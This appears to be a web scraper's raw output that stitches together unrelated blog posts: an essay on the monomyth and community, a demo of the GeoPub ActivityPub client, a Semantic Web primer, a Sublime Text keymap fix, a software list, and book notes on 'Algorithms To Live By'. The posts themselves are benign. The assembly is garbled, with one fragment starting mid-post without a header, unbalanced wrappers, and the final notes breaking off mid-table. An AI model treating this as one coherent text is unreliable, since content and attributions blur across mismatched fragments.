Found CONTENT ['This post has been rattling around in my head for a few months now. It picks up on threads I started in Fear Imm(a/i)nnence and The Struggle for Meaning.\n\nRecommended listening for this post:\n\nEP1 by They Became What They Beheld\n\nThe Monomyth is a Lie\n\nThe hero’s journey - or monomyth - is a dangerous lie. As a template for storytelling it dutifully gets the job done, but the the problem is that it doesn’t work in real life. This is a rhetorical generalization, but: we tend to anchor our personal narratives in the media we consume.\n\nAs an aside, I think this is one of the reasons why representation in media become a subject of discourse lately. A superhero fan I am not, but I couldn’t help but notice all the positive responses from people of color in regards to Black Panther, all the little girls in regards to Wonder Woman. Storytelling 101: we relate to characters who are like us.\n\nThe monomyth is dangerous because it transitively promulgates the myth that you are a solitary hero. Locked in some struggle of man v man, man v nature (more on this one later), man v god, or man v self: it is all up to you.\n\nThis myth of radical self-reliance is further reinforced by folklore such as the American Dream and aphorisms like, “you are responsible for you,” or “early to bed early to rise makes a man healthy, wealthy, and wise.”\n\nMany facets of our culture are built on this idea. In Capitalist Realism (2009), Mark Fisher pointed to “the privatization of stress,” - this notion that we’ve accepted it as incumbent on individuals to resolve their own psychological distress which our society and/or culture created.\n\nStudent debt? Your problem. Neigh! Your responsibility! No one gets a free ticket! Addiction? You didn’t get enough love as a child. Depression? Must’ve been your childhood, too. Or maybe your genetics? Anxiety? You’ve made bad life decisions. Change your circumstances.\n\nToo many of those I love suffer from some or all the above. And too much of their suffering is further exacerbated by the guilt that they can’t fix it themselves. (!)\n\nIn summary, we’re taught that we’re the hero of our story. We’re responsible for the circumstances in our lives. And we’re responsible for digging ourselves out.\n\nThis is the monomyth. And the monomyth is a lie.\n\nPolymythic\n\nAgain, a superhero fan I am not, but I think The Avengers is successful because it offers a plausible challenge to the monomyth. It is an ensemble cast overcoming hardship together. Individual arcs and heroics remain, but the core appeal of the franchise is the team. Their relationships, their banter, their chemistry. I think this paradigm is is more resonant with how humans actually are in the world.\n\nYou wouldn’t exist without your parents. You depend on vast logistics networks for food. If you’re in the developed world, other people work 24/7 to supply you with clean water, electricity, and waste services.  You’re reading this post only because of the infrastructure maintained by the good people at GitHub who I’ll never meet.\n\nIf you work at a company, you have co-workers. If you’re self-employed you probably have clients or customers.\n\nWe are the polymyth.\n\nClimate Crisis\n\nWe all need each other and we always have. The notion that you’re an island leads to isolation, guilt, and anxiety. Not only does this myth isolate us from each other but also the planet itself. Humans are not somehow separate or transcendent or “outside” what we’ve come to call nature. We are natural. Computers and technology are also “natural” - everything you’ve ever seen or thought about is natural. As the lyrics go, “All you touch and all you see is all your life will ever be.”\n\nIt all exists within the same reality. I do not find the distinction of “artificial versus natural,” a very useful one.\n\nJust as we need each other we also need the earth. We always have. Geo-engineering isn’t going to save us. The climate crisis is our crisis.\n\nViznut, writing on his blog:\n\n\n  I am convinced that our civilization is already falling and this fall cannot be prevented. What we can do, however, is create seeds for something better. Now is the best time for doing this, as we still have plenty of spare time and resources especially in rich countries. We especially need to propagate the seeds towards laypeople who are already suffering from increasing alienation because of the ever more computerized technological culture. The masses must realize that alternatives are possible.\n\n\nBands, Collectives, and Communities\n\nWorking together can be hard. For each project listed in my discography there are probably twice that number that are unlisted. Failed, false-started, disbanded, dissolved. I’m an atheist and music venues have always been my places of worship. The communal experience of music is one of the most powerful things I’ve ever felt.\n\nI write, release, and perform music for two reasons. Firstly for myself - because I love the craft, I love the expression, I love the joy of creating. Secondly for you - as an offering, a gift, a chance to have experiences like those I’ve had in mosh pits where I’ve simultaneously lost and found myself.\n\nThis year has marked a huge shift in my practice. I still write music, but I’ve gravitated towards programming tools for others to write music. \nCascades, Conway Music, Markov Music, dronecaster, and arcologies are each expressions of my aesthetics translated into code. Making tools for others is fun, and watching what people make with them is totally surreal.\n\nAll these pieces of software share a common thread, and that thread is monome. A long time ago I saw the grid and knew one day I would get one and make really cool shit with it. The monome community has helped me stay anchored to myself through the solstagia, anxiety, and depression of 2020.\n\n(The irony of the similarity between the words “monomyth” and “monome” is not lost on me.)\n\nI haven’t made this many genuine friends in this short of a time since college. We visit on Zoom, send memes, talk on the telephone. Share our worries and fears and struggles and hopes. These are people who I support and who support me.\n\nNone of that software I built this year would exist without the support, mentorship, and generosity of the members of the community. They are a persistent reminder that I’m not alone. So let this be you’re reminder that you’re not alone.

Found SUMMARY ['As previously mentioned\nopenEngiadina is developing a platform for\ncreating, managing and using crowd-sourced data in meaningful ways.It is my pleasure to announce an initial demonstrator of\nGeoPub, an application for curating\ncrowd-sourced content.For the impatient: Link to the demo.GeoPub is still very rough edged and limited in functionality but I hope good\nenough to demonstrate two ideas:How the ActivityPub protocol  can be\nused to create, share and discuss any kind of structured content.How a content-management system for crowd-sourced data might work.This is an extended demo of the initial GeoPub version, discussion on some known\nissues, things that we have planned, a peek under the hood as well as an outlook\non next steps.For more background on the Semantic Web and Linked Data see a previous post.GeoPubDemo time! GeoPub is a web application and we have an instance hosted\nhere. You can also get the sources\nhere and compile it yourself.On startup GeoPub will attempt to load some initial data. This might take a few seconds.Once loaded, you will see a screen showing recent activity:Every line corresponds to an activity performed by an actor (a person,\norganization or similar):We see four pieces of information:The actor who performed the activity (openengiadina).The type of activity performed (Create).The object the activity was performed on (Note).When the activity was performed.The types of activities are defined by the ActivityStreams Vocabulary.Note that the actor, the activity type and the object are links that you can\nfollow. For example you can follow the\nNote\nlink.This will take you to the "browse" view:In the center pane you see the content of the Note ("Hello World!") and some additional\ninformation such as the identifier and type of the note.In the right-side view related activities are displayed (for the Note we are\nviewing there is only the initial Create activity).On the left there is a menu for browsing different types of content.Activities as contentThe activity itself is just "content" and has it\'s own identifier and can be\nviewed like the note by following the\nCreate link:We see that the created note was made public by addressing it to the special\npublic collection (https://www.w3.org/ns/activitystreams#Public).EventsSo far there is not much that sets apart GeoPub from any ActivityPub client such\nas the Mastodon or Pleroma frontends (except that GeoPub does not look as nice\nand seems overly complicated). What makes GeoPub different is that it displays\ncontent regardless of its type.For example the demo user alice created an event:When following the link My super cool\nevent\nwe see that the type of the object alice created is an "Event":In the "Related Activities" pane you see that Alice created the event, announced\nit and then Bob created a note that is somehow related to the event. The user\ninterface for displaying the related activities is of course very rudimentary.\nFor example you would want to see the content of Bob\'s note immediately when\nviewing the event.Note that we are still in the realms of what is currently done with ActivityPub.\nGancio and Mobilizon are\napplications that are specialized for creating, sharing and interacting with\nevents over ActivityPub.GeoPub on the other hand does not have any special knowledge about events. It\ndoes not treat the event type as a special type. It is not intended for creating\ncontent of a specific type. GeoPub is intended for browsing and curating a wide\nrange of different content types. An event, a description of a hiking trail or a\ntoot are equally interesting.Let\'s see some content types for which there are no ActivityPub applications yet.Ice cream shopThe user bob has created something with the name "Mauri Gelateria":We follow the link and see the created content:The type is IceCreamShop. We can even follow the IceCreamShop\nlink\nand get more information on the type:The type is defined by the schema.org project, a\ncollection of types for defining structured data. There are many more concepts\nand properties that describe the concepts that are defined and can be used to\ndescribe things such as our Gelateria.Given the right interface anybody can create structured content on their\nbusiness, their organization or almost anything, publish it and allow social\ninteractions via ActivityPub on the created content.For example I can like the created ice cream shop:This is the key idea we are trying to develop with openEngiadina: social\ninteraction on arbitrary structured content.The Fediverse and beyondGeoPub is capable of getting data from many different sources.For example it can get data from the Fediverse and display it:The content is fetched directly from the Framasoft ActivityPub outbox. We also\nfetch the actor profile:This data is loaded on initialization as sample data.Note that there is an issue with CORS that might result in you not being able\nto get this data. See below under issues on how to get around it.Embedded ContentMany websites publish embedded structured content in their HTML (using\nRDFa). GeoPub is capable of getting this\ndata.For example, this site (inqlab.net) has embedded meta data that can be fetched by\nentering the URL in the "Enter URL" form:The data will be loaded and displayed:Another nice example is radar.squat.net, an online\nportal of events and groups. Structured content is embedded in the HTML and can\nbe read by GeoPub:Many websites publish such structured content and GeoPub can fetch it and use it.Curating crowd-sourced dataAs seen above the Fediverse and the whole Internet serves as a source for content\nthat can be browsed with GeoPub. The amount of information is almost unlimited,\nwhereas the quality of data is not always up to standards.It seems necessary for individuals and organizations to be able to create\ncurated selection of content and share these selections.On the Fediverse "Announcing" or "Boosting" is one way of curating content\n("retweet" on the birdsite) - content that has been previously created is\nmade visible to your followers.A more elaborate way of doing curation is by creating collections. For example,\nadding existing content to a collection called "Events to publish on website".\nThe interaction pattern is almost identical to announcing or boosting content,\nexcept that you need to choose to which collection the content should be added.The content of this collection "Events to publish on website" can be made public\nand can be used by a static-site generator or a Wordpress plugin to render on a\nwebsite.We are working on implementing the ability to create collections of content in\nopenEngiadina by implementing a Linked Data\nPlatform - a bit like WebDAV for structured\ncontent. This is also the base specification of\nSolid.For now we have implemented a simpler version of this: Liking - or in other\nwords - adding things to a collection of liked content.If authenticated you can like your favorite ice cream shop from GeoPub:Under the hoodA quick peek under the hood of GeoPub.ClojureScriptGeoPub is implemented in ClojureScript. We\nextensively use language specific functionalities and libraries in GeoPub (e.g.\ncore.logic). it seems to be very well suited for "data-driven" applications.Most importantly, ClojureScript is fun. Have a look at the\ncode.ParsersA key functionality of GeoPub is the ability to get structured data from various\nsources in different formats.This is done by using the RDF\nParse JavaScript library. Which\ncan parse data in Turtle,\nJSON-LD and RDFa\n(among others).core.logicIn order to be able to handle all the data from various sources GeoPub\nimplements a query engine using miniKanren, a very\nsimple and lightweight embedded language for logic programming. We use the\ncore.logic implementation of miniKanren\nin Clojure.For example this allows us to very nicely query for all related activities to something:(run* [id]\n  (rdf-logic/graph-typeo graph id (as "Activity"))\n  (fresh [p]\n    (rdf-logic/graph-tripleo graph id p something)))We query for the ids of all activities that have something as object for any\nproperty p.The graph-typeo relation also handles type inference. We do not have to\nspecify all the types of activities but can use the fact that specific\nactivities (such as as:Create) are defined as sub-types of the as:Activity\ntype.We intend to implement more of such nice things (following the lines of Simple\nand Efficient Minimal\nRDFS)\nand also make the query engine directly usable from the interface.Issues and what\'s plannedGeoPub is still far from being usable. Some of the issues we are aware of and\nsome things we are planning to implement:CORSFor security reasons browsers restrict HTTP requests initiated by scripts to\nsites other than the origin of the script (cross-origin requests).This makes a lot of sense for the usual untrusted Javascript that gets loaded\nfrom random sources. However it limits applications that get data from many\ndifferent sources, such as GeoPub.Sites can opt-in to allow requests from cross-origin via a mechanism called\nCross-Origin Resource Sharing\n(CORS). This needs to\nenabled manually on server-side. Practically it is impossible to get all server\nadministrators to enable CORS. Practically it is impossible to implement a\nclient side Linked Data web application.We are thinking about ways to get around this limitation. If you have ideas, we\nwould love to hear about them. Please get in contact.If you would like to try the complete "Linked Data" experience now, I recommend\nusing the CORS\nEverywhere\nplugin for Firefox.There are other related issues that make consuming Linked Data from web clients\nchallenging, such as mixed\ncontent.MapGeoPub has Geo in the name because it was initially conceived to handle\ngeospatial data (such as points of interest, hiking trails, organizaitons with\nphysical locations).We intend to implement a map showing content that has location data attached.Along the same lines we intend to implement a calendar view for data with dates\n(such as events).MultilingualRDF explicitly allows tagging the language of\ncontent. An\nnote can have content in four different languages:@prefix as: <https://www.w3.org/ns/activitystreams#> .\n\n<https://openengiadina.net/objects/sample-note>\n    a as:Note ;\n    as:content "Good day!"@en ;\n    as:content "Guten Tag!"@de ;\n    as:content "Grüezi"@gsw ;\n    as:content "Bun di!"@roh .We intend to use this feature in the data model to pick the most appropriate\ntranslation for content.The example above was encoded in Turtle.\nMultilingual content can also be encoded in\nJSON-LD:{\n  "@context": "https://www.w3.org/ns/activitystreams",\n  "type": "Note",\n  "contentMap": {\n    "en": "Good day!",\n    "de": "Guten Tag!",\n    "gsw": "Grüezi!",\n    "roh": "Bun di!"\n  }\n}Persistent storageCurrently GeoPub does not have any persistent storage. We intend to implement\npersistent storage using the IndexedDB\nAPI.This is an important step towards making GeoPub\nlocal-first software.What\'s next?A quick research stint into how Linked Data and RDF can be used in even more\ndecentralized ways.Unfortunately some aspects of the existing Semantic Web stack require a lot of\ncentralized state manipulation (e.g. Linked Data\nPlatform or Web Access\nControl) which seem\nunsuitable for decentralized platforms and also massively increase the\ncomplexity of servers.Our motivation for doing this research is to keep any server logic as simple as\npossible and allow a transition to a completely decentralized architecture,\nwhile being compatible and data-interoperable with existing technology and data.We want to explore and research:Ideas like Event Sourcing and CQRSCapability-based security and systems implementing it (e.g. Tahoe-LAFS, OcapPub)Convergent and Commutative Replicated Data Types and systems like IrminHow to implement efficient data stores on key-value stores (see SRFI-168 and node-quadstore)Projects working on Linked Data inspired data models\n(InfoCentral and IPLD)AcknowledgmentsThis work was supported by the NLNet Foundation trough the\nNGI0 Discovery Fund.

Found SUMMARY ['For the last couple of months I have been working on a project called\nopenEngiadina. I am very happy to announce that\nopenEngiadina is now being supported by the NLNet\nFoundation.In this post I would like outline the background, the general ideas and the next\nsteps of the project.(Allegra is Hello in Romansch.)BackgroundThe openEngiadina project was started in 2019 in order to allow locals in the\nalpine valley of Engadin to make their cultural and natural heritage more\naccessible to visitors.A system for creating and managing data such as points of interst,\nhiking trails and their real-time status, restaurant and hotel information as\nwell as cultural events was needed.We made two key realizations:The cultural and natural heritage is expressed in very many different kinds\nof data points that are related in sometimes subtle ways.The vast amount of data that needs to be handled, makes it practically impossible\nfor a central authority to efficiently create and manage the data. Data needs\nto be crowed-sourced and crowd-managed.What we need is a mashup between a knowledge repository and a social network. We\ncall this a Semantic Social Network.Semantic Social NetworkA knowledge repository is a system that stores structured content and makes it\navailable via semantic queries. For example one could ask a knowledge repository\nfor a list of inventors that were killed by their own\ninvention or all the public transport stops in Switzerland\nabove\n3000m.\nThe key technology used to achieve this is Linked Data, which allows a\ncombination of various kinds of data and makes them queryable.There are many knowledge repositories and many more interesting data sets\npublished as Linked Data. However, they mostly represent formally codified\nknowledge that was created by experts using specialized tools.Without any formal codification of knowledge, we are extremely well capable of\nsharing, requesting and receiving knowledge via natural language. However, the\namount of knowledge we can process via natural language and the number of\nsources we can consider is limited. Faced with an onslaught of data from modern\ncommunications systems, we are dependent on some sort of structure and\ncodification of knowledge.Existing social networks allow the codification of certain things as structured\ndata. For example, you don\'t have to write a message describing the concert you\nare organizing. You can create an event that represents the concert. Important\ninformation about the event will be available in a structured way, allowing\ndiscoverability. Very much like information in a knowledge repository.We realize that there is much power in the ability to structure knowledge and\nmake it widely accessible and discoverable. At the same time we acknowledge the\nfact that structured knowledge can only emerge from social interaction via\nnatural language (i.e. unstructured knowledge). openEngiadina wants to bridge\nthis gap. It should be much easier to create arbitrary structured data in social\nnetworks, comment them, extend them and finally publish them. We want the status\nof a hiking trail to be as easy to update, share and discuss as a concert or an\nimage of a cat.Open Local KnowledgeThere are thousands of little pieces of information and data that describe the\nsocial, cultural and natural environment of an area. This might include:points of interest on a map (e.g. a mineral spring)social and cultural activities (e.g. a concert)descriptions for outdoor activities (e.g. hiking routes or snow reports)local organizations and businesses (e.g. a book shop, a bakery or a hotel)classifieds (e.g. somebody needs to borrow a drill)status of infrastructure (e.g. snow cover on roads)We call this local knowledge.We believe that local knowledge should be freely available for everyone to use\nand republish as they wish, local knowledge needs to be open knowledge.Furthermore openEngiadina emphasizes the importance for communities to create\nand manage their own data and be capable of operating the necessary\ninfrastructure independently. We hope to help individuals and communities\nachieve digital sovereignty.Beyond the valleyIt is my great pleasure to announce that openEngiadina is receiving financial\nsupport from the NLNet Foundation trough the NGI0 Discovery\nFund.This allows us to do more in-depth research and generalize the ideas to communities beyond the valley.Project overviewIn the scope of the NLNet grant we are working on a couple of fronts towards a\nplatform for open local knowledge. A detailed project plan is in the openEngiadina\nrepository.Here a quick overview:Backend: We are developing a generic ActivityPub server called CPub. The idea is to achieve generality by embracing the right data model and doing as\nlittle as possible.Clients: We strive towards an ecosystem where clients are specialized views\nof the\ndata.\nEvery client (or app) has a specialized function and view of data, that is\nstored in an interoperable way in a common place. Our flagship client is\nGeoPub which is an interface for\ncontent management for crowd-sourced data.Data model and storage: The underlying data model for the platform is Linked\nData, data is modeled as a graph. We are researching ways of making the data\nmodel more decentralized and useable on various platforms.OpenStreetMap: A huge repository of local knowledge exists in\nOpenStreetMap. Unfortunately the data model is\nnot perfectly suited for usage in Linked Data projects. Previous efforts have\ndone much work towards making the OpenStreetMap data available as Linked Data\n(LinkedGeoData.org and OSM Semantic\nNetwork).\nUnfortunately these efforts have stalled and are currently not useable. We\nintend to revive these efforts and provide tooling for projecting\nOpenStreetMap data to Linked Data. This will allow local knowledge to be very\nclosely linked to the existing OpenStreetMap data.Search and Discovery: How can structured data be made searchable and\ndiscoverable in federated networks?What\'s nextWe have recently release an initial version of the backend and are now working\non an initial release of GeoPub (a client). Together they will form an initial\ndemonstrator that we hope to present very soon.Join us in our Matrix room to stay updated: #openengiadina:matrix.org.AcknowledgmentsopenEngiadina is being supported by\nmiaEngiadina and the NLNet Foundation trough the NGI0 Discovery\nFund.We are also very grateful for hosting provided to us by ungleich.'] at ['https://inqlab.net/allegra-openengiadina.html']

Found SUMMARY ['The Semantic Web is a vision to make data on the Web interoperable and understandable to both humans and machines.Unfortunately, the very idea of the Semantic Web is not easily understandable. RDF, XML, Linked Data, OWL, SPARQL, FOAF and a whole bunch of three-letter abbreviations form a cloud of terms and concepts that make it hard to get to the core ideas of the Semantic Web.This is a short introduction to the Semantic Web with the hope of convincing you that its core ideas are surprisingly simple.We approach the topic from the perspective of a data modeler who has been given the task of creating an information system for touristic data.The initial motivational section requires basic knowledge of relational databases. If you want to skip ahead, you can start reading at the second section.Touristic DataA touristic information system should be able to handle data such as:Hotels, hostels, guesthousesRestaurantsCultural eventsPoints of interestOutdoor activitiesReal time data such as weather or road statusA well-proven way of handling such data is with a relational database. We can define tables for each entity type (e.g. Restaurant, Hotel, Hiking Trail).We realize that there are links between the entities in the data that we care about. For example:A restaurant may be the venue for a cultural eventA point of interest may lie on a hiking trailAccessibility to a hotel may depend on the status of a road (e.g. closed because of snow)These links can be created in a relational database by explicitly defining relationships with foreign keys and possibly intermediate entities such as venues.The data model quickly becomes very complicated. Furthermore, if in the future we need to add another data type (e.g. sport events), we would have to introduce a new table and a lot of new foreign keys all over our data model to be able to represent new relationships we might care about.Is there another way of representing and processing such data?Let\'s try using a graph.A simpler data model: A graphLet us try and model the data as a graph. We use nodes to describe concrete entities and abstract concepts (such as restaurant) and connect them with labeled directed edges.We can say that "Pizzeria Dada" is a restaurant as follows:If the Pizzeria Dada lies on a hiking trail we can extend the graph:And if Johnny Cash happens to drop by in town for a concert, we can extend the graph further:Expressing the data as a graph allows us to make interesting queries. For example, we could be interested in finding "all the concerts that are held along the hiking trail to Piz Blups". The answer to this query can be computed by traversing the graph and detecting certain shapes.TriplesThe basic unit of this data representation are two nodes that are connected with a labeled edge. This basic unit is called a triple. The node from where the edge goes out is called the subject, the edge is labeled with a predicate and the node receiving the edge is the object.Our data model is a set of triples.Note that subjects can have multiple outgoing edges:and subjects can be the object of another subject:NamingConsider the situation where a node "Johnny Cash Live" was added to our graph:Unfortunately, both "Johnny Cash Live" and "Johnny Cash Concert" refer to the same concert. The naming of the nodes is ambiguous. We need a naming convention.For instance we could use Uniform Resource Identifiers (URIs) to name things:Think of URIs as an address for a resource, as an Uniform Resource Locator (URL). URIs are a generalization of URLs, but we won\'t care about that distinction now.By naming the node with an URI we\'ve lost the human readable name. Let\'s add it with another triple:We also use URIs to name abstract concepts and properties:The node "Johnny Cash Live" remains as it is. It does not refer to anything, but is a value that describes something. We call such a node a literal.We used names starting with http://schema.org and http://www.w3.org/1999/02/22-rdf-syntax-ns. These are names that have been previously agreed upon by a community. As we will see later, there are advantages in using commonly used names.Linked DataThe basic unit of our data model are triples consisting of a subject, predicate and object. We name things and properties with URIs.Recall that URIs are addresses for resources. What if at the address we used as a name for our nodes there is another graph that extends our graph?For example we can have a graph that has a node http://somewhere-else.org/something:If at the address http://somewhere-else.org/something we can retrieve data that is also in the graph fom that we have seen, for example:Then we could combine the graphs:Therefore, by using addresses (URIs) as names for nodes we are able to extend our graph with remote data. We can link our data with other data. This is called Linked Data.Resource Description FrameworkLet us recap our data model:We model our data as graphs consisting of triples (subject, predicate, object)We use URIs to name thingsWe can extend our graph by fetching more data from the URIs of thingsThe idea behind Linked Data is that we can link our data to other remote data sources and use the same tools and processes on the combined data.The model that we introduced is called Resource Description Framework (RDF). RDF specifies the exact model and form of triples. It is a concrete specification of Linked Data.RDF does not specify any particular way of serialization (a machine-readable format for writing down the graph). There is an XML serialization for RDF, a more human-readable format called Turtle and a JSON serialization (called JSON-LD). Unfortunately, these serializations are very complicated and hard to implement (especially the XML and JSON ones), which has caused a lot of confusion about RDF in general.Let us not worry about serialization for the moment and admire RDF as a simple and powerful data model.Semantic WebUsing RDF allows us to link remote data sources together and use them in a unified way. This enables interoperability.But what makes data understandable?Unambiguous identifiers for things and predicates makes the data understandable.In RDF we need to use URIs for naming things or naming predicates that describe things. By using the same names to talk about the same thing in different contexts we make things understandable across contexts.This seems straightforward when naming things. For example, we could use the URI http://example.org/Alice to uniquely describe the person Alice, and Alice would be described in two different data sets with the same URI. In this way, we understand that both data sets describe Alice and the combination is a more complete description of Alice.The same also holds for names of predicates. For example, the predicate http://schema.org/address can be used to describe the physical address of an item. If we want to send a letter to some subject we would need to check if the subject is in a triple with the predicate http://schema.org/address and send the letter to the object of that triple. The subject could be a person, an institution, or anything that could have a physical address. We don\'t need to care. We understand that if the subject has the address predicate, we probably can send a letter to it.When combining different data sets it is necessary that the same names are used to describe the same things. If one data set uses the predicate http://schema.org/address is used and another uses http://noschema.com/postalAddress, then we won\'t be able to understand that they are both talking about the same thing.It is very important to agree upon a common vocabulary for naming things. There are several projects that aim to provide vocabularies to describe many things (see links at the bottom of this page).Let us recap:The Semantic Web is a vision to make data on the Web interoperable and understandable.Linked Data is an idea on how multiple remote data sources can be made interoperable.RDF is a concrete implementation of Linked Data.Meaning and understanding comes from using same names for same things.That sounds great! Does RDF/Linked Data solve all my problems?Probably not. Even if the data model is simple and powerful there are some drawbacks:The tools and technology used to handle RDF/Linked Data are not as widely used - and maybe not as usable - as other stacks (e.g. relational database).The data model is conceptually different from the more prevalent relational model and requires some mental effort to get used to.Widely used serialization formats of RDF are extremely complicated and difficult to implement (RDF/XML, JSON-LD).Agreeing upon a vocabulary to describe data is hard and requires a lot of social collaboration.Nevertheless, Linked Data is extremely well suited for distributed systems where data interoperability is a high priority.In a future post titled The Semantic Social Network I hope to illustrate how the Semantic Web and Linked Data can be used to create structured content in federated and decentralized networks in a crowd-sourced manner.Further readingThis post is based on a talk given at ActivityPubConf 2019.The Semantic Web: Article by Tim Berners-Lee, James Hendler and Ora Lassila in Scientific America, 2001RDF 1.1 Primer: Official primer on RDFschema.org: General purpose vocabulary.FOAF: Vocabulary to describe people and relationship between them.Linked Open Vocabularies: Collection of vocabularies.'] at ['https://inqlab.net/a-primer-on-the-semantic-web-and-linked-data.html']

This challenge is exponentialy easier as there is so much more fidelity there, and it gave me a chance to play with Affinity Designer, which I’d never used before, as well as some basic bit shifting practice.\n\nThe end result is surprisingly readable, and even has punctuation!\n\n\n'] at ['http://milofultz.com/2021/04/11/tiny-font-3-by-3']

Found CONTENT ['I just spent forever trying to find a solution for this, so I figure putting it up here will be helpful for me and hopefully for others, too.\n\nIn my case, I have been using Emmet to write HTML and CSS much faster. The issue that first came up was that when typing a colon in CSS, by default Sublime Text will add a semicolon. This doesn’t allow Emmet to expand correctly, or at best leaves you with an extra semicolon. After getting a hacky fix for this that didn’t fix the same problem in a Sass package, I had to actually figure out how to solve the root issue.\n\nOdatNurd on StackOverflow provided a fantastic walkthrough to a similar problem and left me with the tools to actually diagnose and solve the problem. You can use this to find out what is happening and in what part of the program, not just flailing and hoping you fix something.\n\n\n  Open the console (View > Show Console or ctrl + ` on OSX).\n  In the console, enter in sublime.log_commands(True).\n  Do what you need to recreate the issue. Immediately after triggering the unwanted behavior, document what you think is causing it that is in the console. In my case it was command: insert_snippet {"contents": ":$0;"}.\n  Depending on which syntax you are in, or which plugin is listed/suspected, use the command palette to View Package File and type in the syntax/plugin. This will show files that are hidden, as well, which makes diagnosing issues with default plugins/syntaxes much easier.\n  Once you find a possible file, open it. Save As in the Packages directory under a new folder called the name of the plugin or syntax. e.g. for the Sass plugin/syntax, I created a folder in Packages called Sass and saved a copy of the Default.sublime-keymap file there, which included my additions. You can find more on overriding packages here.\n  In my case, I copied the old rule over and changed the {"contents": ":$0;"} object to {"contents": ":$0"}, which allowed the colon to be typed without adding any additional characters.\n\n\n\n'] at ['http://milofultz.com/2021/03/06/sublime-keymap']

Found CONTENT ['Programs\n\naText: This is the text and snippet expander that I moved to after using TextExpander for years. It’s only $5 instead of a $36/year subscription and essentially the same program but with more features available, most notably automated keystrokes. I use it most often in my copywriting for podcasts, emails, and projects with a lot of repetition, but it’s also super useful in generating timestamps and datestamps. Much more fun to use than the built-in OSX feature.\n\nDozer: Free and open source app to hide menu bar icons to give your Mac a cleaner look. Helps me not get distracted by unimportant stuff.\n\nEasyRes: Menubar app that allows you to switch screen resolutions quickly and easily. Most useful when using multiple monitors or external keyboard/mouse configs that put the laptop farther away from your eyes.\n\nf.lux: Warms your screen color at sundown until sunup so it doesn’t destroy your eyes in the dark. Just essential and makes using a computer without it almost unbearable.\n\nGrandPerspective: A small utility application for macOS that graphically shows the disk usage within a file system. I use this to monitor unruly client Dropbox folders as well as runaway audio/video projects.\n\niTerm2: Terminal that allows multiple tabs, styling, font choice, etc. Just better than OSX built in.\n\nKarabiner-Elements:   A powerful and stable keyboard customizer for macOS. I use this to map capslock to escape, the bottom right alt button to insert, for some of those old DOS programs, and flip the F-row buttons from having to use fn every time I want to press any actual F key.\n\n1Password: I use Lastpass (I used to use Lastpass, but their free model will only work on a single device at a time, making it useless if you use a phone and computer with it), but use ANY password manager, please please please.\n\nOcenAudio: If Audacity was actually pleasant to use. Not as powerful, but for 99% of what I do, it is much better for audio editing/manipulation in every way.\n\nPyCharm: A much nicer environment to write Python in. Preferred over VSCodium for the built-in Python specific console and debugger.\n\nQuitter: One of my most useful apps. Quits an app based on minutes of inactivity. Super useful for very distracting and/or power-hungry apps like Messages, Slack, etc.\n\nReaper: I use this for all my podcast editing because of the ability to make super useful keyboard shortcuts and Lua scripts along with the varispeed that can go over 2x speed (looking at you, Logic).\n\nRectangle / ShiftIt: Window manager that uses keyboard shortcuts. Super easy to arrange windows into quandrants, screen halves/thirds, etc., or move windows over to other screens. Just overall very useful for smaller single-monitor or large multi-monitor setups.\n\nSublimeText: This is my coding scratchpad as well as my daily task manager using PlainTasks. Not as full featured as PyCharm or VSCodium, but still fantastic and a pleasure to use. Packages I use:\n\n\n  Emmet: If you do any HTML/CSS/JS, get Emmet.\n  HTML-CSS-JS Prettify: Auto-formats different web files for easy editing/analysis.\n  MarkdownPreview: Lets you export Markdown as a Github-flavored HTML file. Good for general prototyping.\n  PlainTasks: Great todo app. I use it for all my workflows and SOP’s since it is not proprietary and is saved as plaintext.\n  RainbowBrackets: Shows your matching brackets at a glance. Makes debugging missed brackets simple.\n  Sync Settings: Helps sync settings across multiple computers.\n\n\nTypora: Super simple and pretty markdown editor I use all of the time for my blog posts, code diary, note taking, and any other markdown-related stuff. Interchangeable CSS themes make it really easy to customize, too.\n\nVSCodium: An open source version of Microsoft’s VSCode, meaning it had none of the bloat that MS adds like tracking, telemetry, etc. Extensions I use:\n\n\n  Bracket Pair Colorizer 2: Same as RainbowBrackets above.\n  Colorize: Shows what colors are in your CSS/Sass when using any color method including variables.\n  ESLint: Javascript linter.\n  Indent-Rainbow: Like bracket colorizers, this gives your indentation a coloring so you can understand indentation more at a glance.\n  Monokai Pro: Same as above.\n  Prettier: Helpful for keeping your code matching code style standards. Auto-formats your code according to user-set rules.\n\n\nFonts\n\nAtkinson Hyperlegible Font: I use this as my default font for sans-serif on my browser so I can set the default font size much smaller and still be readable.\n\nFira Code: I use this in every piece of software that I need monospace fonts. Has ligatures which makes things more readable and easier to understand, as well as dynamic adjustment of heights to match nearby letters. A bunch of things that added together just look really nice.\n\n\n  20210206: Added f.lux and Lastpass, SublimeText and VSCodium extensions to programs, Atkinson Hyperlegible to fonts\n  20210403: Removed Lastpass and added 1Password, HTML-CSS-JS Prettify, Sync Settings\n\n\n\n\n'] at ['http://milofultz.com/2021/01/08/software']

Found CONTENT ['These are notes from the book Algorithms To Live By by Brian Christian and Tom Griffiths. These are all just my paraphrasings and may not be 100% accurate, but I tried to transcribe what I thought were the most salient points and put them up. All unattributed quotes are merely citations from the book.\n\n\n\nExplore/Exploit: AKA What’s New/What’s Best\n\nInterval\n\nThe length of an interval and where you are within it defines whether one should be in a mode of explore or exploit. At the beginning of an interval, one has time and necessity to explore and the highest return on investment of time. At the end, the ROI are almost none to exploring and therefore exploit becomes much more valuable.\n\nA/B Tests\n\n\n  A/B tests are when multiple presentations or implementations are used until the best option is decided upon; then the process repeats with the winner and another option.\n  In A/B testing, the user is the product. The user is being used to gain something that can’t otherwise be gained. This is why online services can be free, is that the providers are getting valuable data.\n\n\nZelen’s Algorithm\n\nZelen’s algorithm is a variant of the A/B test that increases the likelihood of the most successful choice and minimizes the likelihood of the other. It is one way to better quantify the A/B test.\n\n\n  There are two choices or tests (A and B). These are chosen at random as if balls in a hat.\n  When one of the random choices or tests succeeds, the successful choice or test is increased in probability, as in adding another of those balls to the hat. If the choice is a failure, the other choice is increased in probability, as in adding another of those balls to the hat.\n\n\nRegret and Optimism\n\nYour amount of regret will always increase, even if you chose the best choice. If you choose the best choice, it may increase more slowly or slow down, but it is still there. The minimum possible regret increases logarithmically.\n\n\n  In the long run, optimism is the best prevention for regret.\n\n\nUpper Confidence Bounds are the highest payout that an option could possibly have, based on the knowledge we have.\n\n\n  The UCB is always higher than the expected value but by less and less as we get more experience with a particular option.\n\n\nSummary\n\n\n  \n    \n      Explore\n      Exploit\n    \n  \n  \n    \n      Necessary at the beginning\n      Impossible without explore\n    \n    \n      Only explore means no ability to connect or grow with discoveries\n      Only exploit means no 